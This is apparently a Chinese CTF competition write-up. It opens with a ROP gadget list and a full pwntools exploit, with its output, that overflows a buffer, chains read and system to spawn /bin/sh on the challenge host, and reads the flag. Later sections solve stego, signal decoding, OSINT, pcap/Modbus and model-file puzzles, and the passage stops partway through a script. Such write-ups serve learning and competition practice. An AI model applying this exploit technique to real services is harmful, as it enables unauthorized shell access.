0x0000000000401017 : add esp, 8 ; ret
0x0000000000401291 : add rsp, 0x58 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401243 : cli ; jmp 0x4011d0
0x0000000000401193 : cli ; ret
0x000000000040129b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401240 : endbr64 ; jmp 0x4011d0
0x0000000000401190 : endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004011b5 : je 0x4011c0 ; mov edi, 0x404048 ; jmp rax
0x00000000004011f7 : je 0x401200 ; mov edi, 0x404048 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401244 : jmp 0x4011d0
0x000000000040100b : jmp 0x4840103f
0x00000000004011bc : jmp rax
0x00000000004011bd : loopne 0x401225 ; nop ; ret
0x0000000000401226 : mov byte ptr [rip + 0x2e5b], 1 ; pop rbp ; ret
0x00000000004011b7 : mov edi, 0x404048 ; jmp rax
0x00000000004011bf : nop ; ret
0x0000000000401248 : nop dword ptr [rax + rax] ; pop rdi ; ret
0x000000000040123c : nop dword ptr [rax] ; endbr64 ; jmp 0x4011d0
0x00000000004011b6 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x0000000000401294 : pop rax ; ret
0x000000000040122d : pop rbp ; ret
0x0000000000401228 : pop rbx ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401250 : pop rdi ; ret
0x0000000000401254 : pop rdx ; ret
0x0000000000401252 : pop rsi ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040129d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040129c : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040124a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rdi ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004011b3 : test eax, eax ; je 0x4011c0 ; mov edi, 0x404048 ; jmp rax
0x00000000004011f5 : test eax, eax ; je 0x401200 ; mov edi, 0x404048 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x0000000000401156 : xor eax, eax ; add rsp, 8 ; ret

Unique gadgets found: 59
```

这里提取到了几个好用的：

```bash
0x0000000000401250 : pop rdi ; ret
0x0000000000401252 : pop rsi ; ret
0x0000000000401254 : pop rdx ; ret
0x000000000040101a : ret
```

这里几乎就要完成 ret2system 了，但是 `/bin/sh` 无法找到，因此这应该就是题目的蕴意。

要 call 的 这个 name 就是这个字符串。

没有办法不存在我们就只能自己写，要写的话 .bss 段就是很好的目标，没开 PIE 所以地址已知，大小管够。

```asm
LOAD:0000000000404048                    ; ===========================================================================
LOAD:0000000000404048
LOAD:0000000000404048                    ; Segment type: Pure data
LOAD:0000000000404048                    ; Segment permissions: Read/Write
LOAD:0000000000404048                    LOAD            segment mempage public 'DATA' use64
LOAD:0000000000404048                                    assume cs:LOAD
LOAD:0000000000404048                                    ;org 404048h
LOAD:0000000000404048                                    public __TMC_END__
LOAD:0000000000404048 ??                 __TMC_END__     db    ? ;               ; DATA XREF: deregister_tm_clones↑o
LOAD:0000000000404048                                                            ; deregister_tm_clones+5↑o ...
LOAD:0000000000404048                                                            ; Alternative name is '_edata'
LOAD:0000000000404048                                                            ; Alternative name is '__bss_start'
```

.bss 段的起始地点在 0x404048。

随后我们再思考一下 24 个字节的空间绝对是不够的，这里可能需要扩容。

函数返回时 read 的参数填充的非常好，我们只需要修改 rdx 为更大的值然后重新调用 read 我们就可以逆天改命。

随后有了更大的空间我们就可以随意构造 ROP 链了。

修改 rsi 指向 .bss 段，随后调用 read 可以补充好 `/bin/sh` 的来源，之后的 ret 我们就可以补充上 ret2system 的 ROP 链了。

检查一下函数的地址：

```asm
.plt.sec:0000000000401090                    ; ssize_t read(int fd, void *buf, size_t nbytes)
.plt.sec:0000000000401090                    _read           proc near               ; CODE XREF: take_message+2C↓p
.plt.sec:0000000000401090 000 F3 0F 1E FA                    endbr64
.plt.sec:0000000000401094 000 F2 FF 25 8D 2F                 bnd jmp cs:off_404028
.plt.sec:0000000000401094 000 00 00          _read           endp

.plt.sec:0000000000401080                    ; int system(const char *command)
.plt.sec:0000000000401080                    _system         proc near               ; CODE XREF: main+92↓p
.plt.sec:0000000000401080 000 F3 0F 1E FA                    endbr64
.plt.sec:0000000000401084 000 F2 FF 25 95 2F                 bnd jmp cs:off_404020
.plt.sec:0000000000401084 000 00 00          _system         endp
```

exp 如下：

```py
from pwn import *

exe = ELF("./call_my_name")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 40730)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    io.recvuntil(b'tone.')
    
    bss = 0x404048
    
    pop_rdi = 0x401250
    pop_rsi = 0x401252
    pop_rdx = 0x401254
    ret = 0x40101a
    
    read = 0x401090
    system = 0x401080
    
    stage1 = b"A" * 0x58
    stage1 += p64(pop_rdx)
    stage1 += p64(0xF0)
    stage1 += p64(read)
    
    send(stage1)
    
    stage2 = p64(ret) * 14
    stage2 += p64(pop_rsi)
    stage2 += p64(bss)
    stage2 += p64(read)
    stage2 += p64(pop_rdi)
    stage2 += p64(bss)
    stage2 += p64(ret)
    stage2 += p64(system)
    
    stage2 = stage2.ljust(0xF0, b"C")
    
    send(stage2)
    
    stage3 = b"/bin/sh\x00"
    
    send(stage3)
    
    interactive()


if __name__ == "__main__":
    main()
```

注意这里 `stage2 = p64(ret) * 14` 是因为我们不是 syscall 得到的 shell 而是利用 libc 的函数，而我们构造的 ROP 链可能会破坏先前函数的栈帧。导致 system() 内部不会从偏移 0 处返回。

因此这里设置了一个滑跑 ret 确保可以一路滑到 payload。

另外既然都要 ret 了，平栈也可以顺便在这里一并完成，不过我这里还是另外平栈，这样逻辑看起来更正确一点。

此外由于这个参数依赖 libc 版本，在本地我使用 5 测试可以成功，但在远程不行，经测试 14 可以成功。 

输出如下：

```bash
❯ python exp.py
[*] '/home/halfcity/Desktop/call_my_name'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 110.42.112.160 on port 40730: Done
[DEBUG] Received 0xa5 bytes:
    b'C a l l   M y   N a m e\n'
    b'\n'
    b'The night shift at a retired\n'
    b'telephone exchange.\n'
    b'The operator left years ago;\n'
    b'the board still places any call,\n'
    b'if you ask it the right way.\n'
[DEBUG] Received 0x9d bytes:
    b'  ... only the dial tone hums through the empty exchange.\n'
    b'(When feel alone)\n'
    b'(Just call my name)\n'
    b'I will hear your voice -- leave your message after the tone.\n'
[*] sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT\x12@\x00\x00\x00\x00\x00\xf0\x00\x00\x00\x00\x00\x00\x00\x90\x10@\x00\x00\x00\x00\x00'
[DEBUG] Sent 0x70 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000050  41 41 41 41  41 41 41 41  54 12 40 00  00 00 00 00  │AAAA│AAAA│T·@·│····│
    00000060  f0 00 00 00  00 00 00 00  90 10 40 00  00 00 00 00  │····│····│··@·│····│
    00000070
[+] payload sent
[*] sending payload: b'\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00R\x12@\x00\x00\x00\x00\x00H@@\x00\x00\x00\x00\x00\x90\x10@\x00\x00\x00\x00\x00P\x12@\x00\x00\x00\x00\x00H@@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x80\x10@\x00\x00\x00\x00\x00CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
[DEBUG] Sent 0xf0 bytes:
    00000000  1a 10 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │··@·│····│··@·│····│
    *
    00000070  52 12 40 00  00 00 00 00  48 40 40 00  00 00 00 00  │R·@·│····│H@@·│····│
    00000080  90 10 40 00  00 00 00 00  50 12 40 00  00 00 00 00  │··@·│····│P·@·│····│
    00000090  48 40 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │H@@·│····│··@·│····│
    000000a0  80 10 40 00  00 00 00 00  43 43 43 43  43 43 43 43  │··@·│····│CCCC│CCCC│
    000000b0  43 43 43 43  43 43 43 43  43 43 43 43  43 43 43 43  │CCCC│CCCC│CCCC│CCCC│
    *
    000000f0
[+] payload sent
[*] sending payload: b'/bin/sh\x00'
[DEBUG] Sent 0x8 bytes:
    00000000  2f 62 69 6e  2f 73 68 00                            │/bin│/sh·│
    00000008
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode

$ ls /
[DEBUG] Sent 0x5 bytes:
    b'ls /\n'
[DEBUG] Received 0x67 bytes:
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'flag\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libx32\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x37 bytes:
    b'flag{ju5T-CAL1-My-NAme_4nD-1-w1ll_H3AR_yOur_vOIC335b3}\n'
flag{ju5T-CAL1-My-NAme_4nD-1-w1ll_H3AR_yOur_vOIC335b3}
$
```

```txt
flag{ju5T-CAL1-My-NAme_4nD-1-w1ll_H3AR_yOur_vOIC335b3}
```

## Misc

### MISSION 03 「无线电社团的怪信号」

```txt
阿尼亚在伊甸学园无线电社团帮忙整理旧设备，学长从一台老式接收机里截获了一段信号。那声音里，有频率缓慢滑动的尖响，像老式调制解调器在拨号，有电话按键被按下时那种音调固定的短音，还有几段忽长忽短、像谁在轻轻敲着什么的声响。阿尼亚听不懂，但她觉得这段声音里藏了好几件事。
```

#### Track 1 SSTV

明显的 SSTV，直接在线解码：

![](https://img.halfcity.top/2026/11/10/460039af918962f9bf6239d32a24b4c6.png)

```txt
flag{inside_t#e_Club_@nya_heard_ssTu_on_7he_radio_
```

#### Track 2 Morse

摩斯密码，记录一下：

```txt
- - - / -- --- .-. ... . / ..-. .-. --- -- / .- / - . .-.. . --. .-. .- .--. .... / - - -
```

解码为 `MORSE FROM A TELEGRAPH` 并按照上一张图片内容写成这种形式：

```txt
MORSE-FROM-A-TELEGRAPH
```

#### Track 3 DTMF

第三部分是 DTMF，在线解析一下：

```txt
0054s .............999..555###.
0055s ..999..777###...111..111.
0056s ..000###..666...888###..9
0057s 99...555###..111...000..000
0058s 00###...111..111...666###
0059s ..111...000..999###...111
0060s ..000...222###..999...555
0061s ###..111...111..111###...00
0062s 111..111...000###..999...00
0063s 555###..999...777###..999
0064s ...555###..111...000..777
0065s ###...111..000...111###..00
0066s 888...999###..111...111..00
0067s 222###...666..444###...11
0068s 1..000...000###..111...22
0069s 2..555
```

```txt
95#97#110#68#95#100#116#109#102#95#111#110#95#97#95#107#101#89#112#64#100#125
```

将 `#` 作为分隔符，其他部分解码为 ASCII：

```txt
_anD_dtmf_on_a_keYp@d}
```

```txt
flag{inside_t#e_Club_@nya_heard_ssTu_on_7he_radio_MORSE-FROM-A-TELEGRAPH_anD_dtmf_on_a_keYp@d}
```

### MISSION 04 「贝姬的闺蜜密信」

```txt
肩書きの上で 踊るシルエット 本音は胸ポッケに仕舞っておこう 疎らな足音 リズムを崩されるような そんなノイズも心地良い ドタバタな日々を チグハグな歩幅で歩いていく 繋いだ手の平に 確かに感じる温もり 誰もが着飾り踊るアクター それでも何処か 君と僕の会話の隙間 見え隠れしている 想いは投げ合うほどに 安堵する不思議 いつか終わるこんな日々だけど 今はまだ このハチャメチャで 歪な僕らの 明日を願っている 陽が落ちる頃 ぼやけるシルエット 別の顔を纏って夜を駆ける 完璧にみせた 不可能はまるでないような そんな理想を追いかけて クタクタに疲れて デコボコに擦り減る心を 繋ぎ止める光は 何時かの僕との約束 見上げた空を満たすステラ その一つ一つが 違う記憶 抱えて浮かぶ孤独な瞬き 胸に秘めた君の心の内 読み解けたのなら なんて悩む日もあるけれど すれ違いながら 不揃いな心でも向き合っていたいんだ 見えないものに愛は潜んでいる 誰もが 誰にも見せない 顔を隠してる それは大事な人を想う 優しさの証 誰もが着飾り踊るアクター それでも僕ら 手と手を繋ぎ今日も描く まだ見ぬストーリー 揺るがない想いはいつしか シナリオを越える いつか終わるこんな日々だから 今はただ このハチャメチャで 歪な世界を 華麗に舞い踊る 
```


#### Track 1 零宽字符隐写

文件里可见内容是一段 base64，其中混着两种零宽字符：U+200B（ZWSP）748 个、U+200D（ZWJ）276 个，恰好共 1024 个 = 128 字节。按出现顺序把它们当作二进制流（ZWSP=0、ZWJ=1），每 8 位一个字节，得到的是 UTF-16BE 编码的文本：

```txt
part1:flag{wakuwaku_you_know-zero_w!dth-ChaRact3r_stegan0graphy_
```

#### Track 4 base64 填充位隐写

以 _ 结尾提示还有后半段，藏在可见 base64 本身。把零宽字符剔除后，57 行 base64 解码出来是一段日文歌词，但每行都以空格结尾，且结尾字符各不相同——IG==、IH==、IK==、ID=……这些末尾字符的低 4 位或低 2 位并不影响解码结果，属于自由位。

按行序提取全部 228 个自由位，重组为 28 字节：

```txt
part2:and_b64_paddlng_stego}
```

两段拼接即为最终 flag。

完整解密脚本：

```py
import base64
import re
import sys

ZW = '\u200b\u200d'  # ZWSP / ZWJ
B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'


def part1_zero_width(text: str) -> str:
    # 按出现顺序: ZWSP=0, ZWJ=1 -> 比特流 -> 字节 -> UTF-16BE
    bits = ''.join('0' if c == '\u200b' else '1' for c in text if c in ZW)
    bs = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) // 8 * 8, 8))
    return bs.decode('utf-16-be')


def part2_b64_padding(text: str) -> str:
    # 剔除零宽字符后, 每行base64末字符的低自由位(2个'='有4位, 1个'='有2位)
    bits = ''
    for line in text.splitlines():
        b64 = re.sub(f'[{ZW}]', '', line).strip()
        if not b64:
            continue
        core = b64.rstrip('=')
        npad = len(b64) - len(core)
        free = B64.index(core[-1]) & (0xF if npad == 2 else 0x3)
        bits += format(free, '04b' if npad == 2 else '02b')
    bs = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) // 8 * 8, 8))
    return bs.decode('ascii')


def main():
    text = open(sys.argv[1], encoding='utf-8').read()
    p1 = part1_zero_width(text)
    p2 = part2_b64_padding(text)
    print(p1)
    print(p2)
    flag = p1.split(':', 1)[1] + p2.split(':', 1)[1]
    print('FLAG:', flag)


if __name__ == '__main__':
    main()
```

```bash
> python codex.py attachment_32286f.txt
part1:flag{wakuwaku_you_know-zero_w!dth-ChaRact3r_stegan0graphy_
part2:and_b64_paddlng_stego}
FLAG: flag{wakuwaku_you_know-zero_w!dth-ChaRact3r_stegan0graphy_and_b64_paddlng_stego}
```

```txt
flag{wakuwaku_you_know-zero_w!dth-ChaRact3r_stegan0graphy_and_b64_paddlng_stego}
```

### OSINT之旅2

db349b97c37d22f5ea1d1841e3c89eb4

可以看到这是著名的勒索病毒 WannaCry，也是永恒之蓝的成名之战。

这里的检测率也是高的吓人，到了 68 / 70 远超 msf 生成的马的 28 / 70。

```txt
flag{家族名称_漏洞利用工具名称_微软安全公告编号_公告首次发布日期}
```

家族名称：wannacry

漏洞利用工具名称：eternalblue

微软安全公告编号：ms17-010

这三个想必都烂熟于心了，但是具体时间还真不太清楚。

从这里可以看到微软的安全公告以及漏洞补丁：

![](https://img.halfcity.top/2026/11/10/d7da1416b1565b49834c76f9fd0e1350.png)

公告首次发布日期是 2017年3月14日。

我们将信息按要求拼接成 flag 即可：

```txt
flag{wannacry_eternalblue_ms17-010_20170314}
```

### OSINT之旅3

![](https://img.halfcity.top/2026/11/10/49d7c5b1b1c690c0769e8b4bc1233c61.png)

```txt
众所周知，美国大兵始终秉持着“秘密是国家的，粉丝是自己的”的原则 小军在B站上发现了一段视频，他截了一张美国大兵驾驶F16刚起飞时的关键帧给你，截图里有一个关键的地点(截图左下角)，最后小军在油管进行关键词搜索，找到了原博主和该基地官方的共创视频，又在该博主的近两个月视频中找到了大量体验F16的视频，小军发现都是博主与同一位飞行员的视频。当然B站也是可以找到油管上的原始视频的。

你的任务 1.你找到截图左下角这个场地的联系电话。如+1 114-514-1919记为+1_114-514-1919 2.美国大兵所在的基地名称。如Chang Shui Base -> 记为Chang_Shui_Base 3.请你找到这位飞行员隶属的中队(squadron)编号

flag最后是flag{场地电话_基地名称_中队编号} flag格式：flag{+1_114-514-1919_Joint_Base_Pearl_Harbor_Hickam_111}
```

题目是一张战斗机座舱的图片。

我们先将图片交给 AI 快速定位一下是否有直接的公开信息：

![](https://img.halfcity.top/2026/11/10/485b822885cb4aa2301f3cda6e46cc33.png)

![](https://img.halfcity.top/2026/11/10/d38a9fb603cfd2725405070543be6d49.png)

沿着 AI 说的 BV 号去找确实发现了一个视频，几乎和图片中说的一模一样。

虽然这个大概率不是原视频，但是我们可以根据标题和简介定位到这是爱德华兹空军基地的第 416 飞行测试中队。

给出的图片是在低空，可能是刚离场并在爬升的阶段，所以这里应该不会离基地太远。

左下角细看一下蜿蜒成这样的应该是赛道，所以这应该是某一个 `赛车场 / 试车场 / 汽车公园 `

接下来没啥好说的了，让 AI 批量找出所有在基地周围的类似设施，然后人工使用谷歌地球一个个看。

这个地方最突出的特征就是大跑道包小跑道，同时小跑道还有一个和鸟一样突出的头部。

最后我定位到了这个地方：

```txt
Hyundai Motor Group California Proving Ground, California 58, California City, 加利福尼亚美国
```

![](https://img.halfcity.top/2026/11/10/8c093c4d27b9a70b069304f158e934c6.png)

我们稍微转动一下视角来拟合图片：

![](https://img.halfcity.top/2026/11/10/ed7383845e15b41959294960b2741d5b.png)

可以看到这里的左下角和题目中的几乎一致。

电话也已经由谷歌地球给出：`+1 949-790-5500`。

根据格式将收集到的信息拼接成 flag 即可：

```txt
flag{+1_949-790-5500_Edwards_Air_Force_Base_416}
```

### 零点广播 01：谁替我发了通知

```txt
你拿到了网关在事发前后的网络抓包。请定位 正式实验室 ECHO 中，署名 mrsh、声称归档维护完成且原目录已清理的那条通知，查明实际发送它的主机 IPv4 地址，并恢复该次通知对应的回执编号 receipt_id

提交格式：flag{源IPv4地址_回执编号}
```

这里先尝试直接搜索名字，找到了很多请求：

![](https://img.halfcity.top/2026/11/10/890717379245b2184331e0e318695732.png)

其中我们还找到了不少关键词，我们将关键词加上再搜索试试：

![](https://img.halfcity.top/2026/11/10/168175e412510481ec118cdbdd5e3972.png)

一个个排查看请求体，看到有很多几乎一样的响应，但是其中有一个响应看起来与众不同。

我们追踪流看一下：

![](https://img.halfcity.top/2026/11/10/3269986da1d61b0c21a8b1b720cf768b.png)

这里我们得到了源 IP `172.30.52.10`。

注意到这里返回了一个存档文件，我们使用 Wireshark 导出并解压。

然后可以在一个 receipt.json 中看到以下内容：

```json
{
  "event_id": "ECHO-0042",
  "receipt_id": "J93TEDB03IO0",
  "operator": "mrsh",
  "action": "archive_cleanup",
  "result": "accepted",
  "lab": "ECHO"
}
```

这里我们可以得到 receipt_id 为 `J93TEDB03IO0`。

```txt
flag{172.30.52.10_J93TEDB03IO0}
```

### 遇到隐写要拿出真本事

```txt
鲁迪乌斯转生到了陌生的远方。他把一句绝不能忘记的誓言拆成三段，藏在了旅途中的三个有关“转折点”的记忆里：一张与艾莉丝有关的照片、一段洛琪希录下的奇怪声音，以及一篇希露菲所写的书信……它们真的只是普通文件吗？ 请帮助鲁迪乌斯找回三段记忆，按照旅途的顺序将它们拼接起来。
```

#### Track 1 steghide

里面有一个提示文件：

```txt
艾莉丝把第一段记忆藏进了照片，但肉眼可看不出来。
JPEG 图片里也能藏文件；试试使用 steghide 检查并提取它吧。
（这部分没有设置密码，提取出的内容还需要再做一次常见编码解码）
```

根据提示我们直接提取文件即可：

```bash
❯ steghide extract -sf part1.jpg
Enter passphrase:
wrote extracted data to "flag1.txt".

❯ cat flag1.txt
ZmxhZ3tMMXYzXw==%    

❯ echo ZmxhZ3tMMXYzXw==|base64 -d
flag{L1v3_
```

```txt
flag{L1v3_
```

#### Track 2 频谱图隐写

里面还是有一个提示文件：

```txt
洛奇希师父教过：有些咏唱不是用来“听”的，而是用来“看”的。
好像要看看频谱图？
```

直接告诉我看频谱图了，那我肯定是要听话去看的：

![](https://img.halfcity.top/2026/11/10/109be151805b2c9ccd11c40054b07e4f.png)

```txt
Th1s_L1f3_
```

#### Track 3 Snow 隐写

依旧有提示，出题人最良心的一题：

```txt
这是希露菲寄来的信。北境的雪没有盖住文字，却悄悄落在了每一行的末尾。
```

直接明示了 snow 隐写，直接提取即可：

```bash
❯ stegsnow -C part3.txt
S3ri0usly}
```

```txt
S3ri0usly}
```

最后的 flag：

```txt
flag{L1v3_Th1s_L1f3_S3ri0usly}
```

### 零点广播 02：空无一人的控制室

```txt
请确定捕获区间内 ECHO 正式单元第一次成功启动播报的写入请求，提取其事务ID，并恢复该次启动的完整播报文本

提交格式：flag{事务ID_播报内容}
```

打开一看可以观察到一些 http 请求和大量的 modbus 通信。

所以这应该是一个 ICS 环境，因为有大量的 PLC 通信。

随便看看 http 请求，我们希望可以找到具体通信的协议内容。

这里找到了一个请求，它似乎返回了通信协议的细节：

```json
GET /api/panel-config HTTP/1.1
Accept-Encoding: identity
User-Agent: ECHO-Panel/1.0
Host: echo-panel
Connection: close

HTTP/1.1 200 OK
Server: EchoPanel/1.0 
Date: Fri, 02 Oct 2026 07:37:34 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 2084
Connection: close
Cache-Control: no-store

{
  "schema": "echo.panel-layout",
  "panel": {
    "title": "ECHO ............",
    "profile": "text-broadcast"
  },
  "driver": {
    "protocol": "modbus-tcp",
    "register_area": "holding",
    "address_base": 0
  },
  "channels": [
    {
      "unit_id": 1,
      "label": "ECHO"
    },
    {
      "unit_id": 2,
      "label": "ECHO-PREVIEW"
    }
  ],
  "tags": {
    "brightness": {
      "address": 1,
      "type": "uint16",
      "access": "rw"
    },
    "display_page": {
      "address": 2,
      "type": "uint16",
      "access": "rw"
    },
    "play_command": {
      "address": 16,
      "type": "uint16",
      "access": "rw"
    },
    "play_state": {
      "address": 17,
      "type": "uint16",
      "access": "ro"
    },
    "start_count": {
      "address": 18,
      "type": "uint16",
      "access": "ro"
    },
    "draft_length": {
      "address": 240,
      "type": "uint16",
      "access": "rw",
      "unit": "bytes"
    },
    "draft_text": {
      "address": 256,
      "registers": 32,
      "type": "string",
      "access": "rw",
      "encoding": "ASCII",
      "byte_order": "high-byte-first",
      "length_tag": "draft_length"
    }
  },
  "ui": {
    "brightness": {
      "tag": "brightness",
      "label": "............",
      "minimum": 0,
      "maximum": 100
    },
    "page_selector": {
      "tag": "display_page",
      "options": {
        "0": "............",
        "1": "............"
      }
    },
    "status": {
      "tag": "play_state",
      "labels": {
        "0": "......",
        "1": "........."
      }
    },
    "counter": {
      "tag": "start_count",
      "label": "............"
    },
    "editor": {
      "tag": "draft_text",
      "label": "............",
      "max_bytes": 64
    },
    "actions": {
      "start": {
        "label": "......",
        "tag": "play_command",
        "value": 1
      },
      "stop": {
        "label": "......",
        "tag": "play_command",
        "value": 0
      }
    },
    "help": ".................................................................."
  }
}
```

可能这是给 HMI 提供的接口？

我们简单解读一下：

- 我们需要的 channel `ECHO` 的 unit_id 为 1
- 提供的这片区域的寄存器是保持寄存器
- `play_command` 寄存器的地址是 16
- 地址 240 是文本长度
- 地址 256 以后是文本

据此我们可以过滤出对这些寄存器的操作。

首先先找找对目标寄存器的写操作：

![](https://img.halfcity.top/2026/11/10/4ea55206fd306d1247cbf33362d4201d.png)

这里要的是第一次启动，所以事务ID就是 `8961`。

随后我们可以过滤出对文本寄存器区域的写操作：

![](https://img.halfcity.top/2026/11/10/63dc57b162fe73b595982ff7b1847015.png)

数量不多，接下来一个个检查写了什么东西。

去掉那个一堆 `XXX` 其中可读的文本如下：

```txt
ECHO_SYSTEM_READY

r_yOu_7or_

l'v3_b33n_

@_I0ng_t1m3

w41tXX9_f0

in
```

直接连起来提交发现不对，思考一下它的写操作可能不是顺次的，所以我们需要再检查一下写寄存器的顺序以及长度寄存器的值。

不过我就懒得去看了，这里的 `ECHO_SYSTEM_READY` 应该不是 flag 的一部分，因为风格差异过大。

剩下的根据语意排列组合一下就能得到 flag。

大意为，我早已等候多时。

```txt
flag{8961_l'v3_b33n_w41tin9_f0r_yOu_7or_@_I0ng_t1m3}
```

### AEGIS-MODEL

pth 文件的本质是 zip 文件。

我们解压可以看到一个 hint 图片：

![](https://img.halfcity.top/2026/11/10/e2340b7b4dcf25edceff5ee13ae40577.png)

这是一个路径评分函数 带转移代价的序列对齐 / Viterbi。

我们使用 pytorch 提取一下基础的信息：

```json
meta = {
    'dim': 32,
    'token_count': 65,
    'token_format': 'base64',
    'alphabet': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
    'path_weight': 0.8,          # λ
    'build': 'aegis-memory-bank-20501003'
}

state = {
    'embedding.weight': [65, 32],   # e_k，65 个 base64 字符的 embedding
    'target_bank':      [44, 32],   # t_0 ... t_43，观测序列
    'transition':       [65, 65],   # T 转移代价矩阵
    'auxiliary':        [6, 32]     # 备用，本任务未用到
}
```

我们的目标应该是是找使 Score 最小 的路径 $P$（$d_1$​ 用 L1 或 L2 结果相同）

这里的 pth 文件不是标准的格式，我们转化一下并求解最短路径：

```py
import zipfile
from pathlib import Path
import torch
import numpy as np
import base64
import tempfile

def load_model(pth_path):
    with tempfile.TemporaryDirectory() as tmp:
        with zipfile.ZipFile(pth_path) as zf:
            zf.extractall(tmp)
        model_dir = Path(tmp) / "model2" / "model"
        fixed = Path(tmp) / "fixed.pth"
        with zipfile.ZipFile(fixed, "w") as zf:
            for p in model_dir.rglob("*"):
                if p.is_file():
                    zf.write(p, "archive/" + str(p.relative_to(model_dir)))
        return torch.load(fixed, map_location="cpu", weights_only=False)

def viterbi(tb, emb, trans, lam, dist_fn):
    n, K = tb.shape[0], emb.shape[0]
    dp = np.full((n, K), np.inf)
    prev = np.full((n, K), -1, dtype=int)
    for k in range(K):
        dp[0, k] = dist_fn(tb[0], emb[k])
    for i in range(1, n):
        for k in range(K):
            costs = dp[i - 1] + lam * trans[:, k]
            best = np.argmin(costs)
            dp[i, k] = costs[best] + dist_fn(tb[i], emb[k])
            prev[i, k] = best
    path = []
    k = int(np.argmin(dp[-1]))
    for i in range(n - 1, -1, -1):
        path.append(k)
        k = prev[i, k]
    return path[::-1]

data = load_model("model.pth")
state, meta = data["state"], data["meta"]
emb   = state["embedding.weight"].numpy()
tb    = state["target_bank"].numpy()
trans = state["transition"].numpy()
lam   = meta["path_weight"]
alphabet = meta["alphabet"]

def L1(a, b):
    return np.abs(a - b).sum()

path = viterbi(tb, emb, trans, lam, L1)
token_str = "".join(alphabet[i] for i in path)
print(f"Path (base64)        = {token_str}")

decoded = base64.b64decode(token_str)
print(f"Decoded bytes (hex)  = {decoded.hex()}")
print(f"Decoded string       = {decoded.decode()}")
```

输出如下：

```txt
> python solution.py
Path (base64)        = ZgoNBhwsZAJWD19oDWFeXn51C0FWe2hfW2xoRQdCfzU=
Decoded bytes (hex)  = 660a0d061c2c6402560f5f680d615e5e7e750b41567b685f5b6c684507427f35
Decoded string       = f
a^^~u
     AV{h_[lhEB5
```

得到了 Path： `ZgoNBhwsZAJWD19oDWFeXn51C0FWe2hfW2xoRQdCfzU=`。

但似乎 base64 解码后是乱码，可能有一层加密？

但是我们没有任何有关加密算法的信息，也没有密钥，但是平心而论得到如此标准的结果不太可能是答案错误，所以加密应该是简单的加密。

这里我们注意到解码的第一个字符是 f，正好是 flag 的开头。

`f ^ 0x00 = f`，所以可能这是一个流式异或加密并且初始密钥就是 0x00。

事实证明确实如此。

最后我们得到完整的解密脚本：

```py
import zipfile
from pathlib import Path
import torch
import numpy as np
import base64
import tempfile

def load_model(pth_path):
